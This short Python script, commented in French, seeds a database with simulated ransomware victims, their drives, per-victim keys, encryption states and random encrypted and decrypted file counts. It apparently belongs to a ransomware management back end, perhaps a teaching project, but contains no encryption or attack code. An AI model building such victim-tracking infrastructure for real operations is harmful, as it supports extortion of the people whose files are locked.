import utile.data as data
import hashlib
import random
import socket
from datetime import datetime

# valeurs de simulation
table_victim = [
    ['WORKSTATION', 'c:,e:,f:', 'key', 'INITIALIZE'],
    ['SERVEUR', 'c:,e:', 'key', 'CRYPT'],
    ['WORKSTATION', 'c:,f:', 'key', 'CRYPT'],
    ['WORKSTATION', 'c:,f:,y:,z:', 'key', 'PENDING']
]

id = 0
conn, cursor = data.connect_to_DB()
for victim in table_victim:
    id += 1
    data.execute_query(conn, cursor, f'INSERT INTO victims(hash, os, disks, key) VALUES ("{hashlib.sha256((socket.gethostname()+str(datetime.timestamp(datetime.now()))).encode()).hexdigest()}", "{victim[0]}", "{victim[1]}", "{victim[2]+str(id)}")')
    data.execute_query(conn, cursor, f'INSERT INTO encrypted(id_victim, nb_file) VALUES ("{id}", "{random.randint(1,2000)}")')
    data.execute_query(conn, cursor, f'INSERT INTO decrypted(id_victim, nb_file) VALUES ("{id}", "{random.randint(1, 2000)}")')
    data.execute_query(conn, cursor, f'INSERT INTO states(id_victim, state) VALUES ("{id}", "{victim[3]}")')


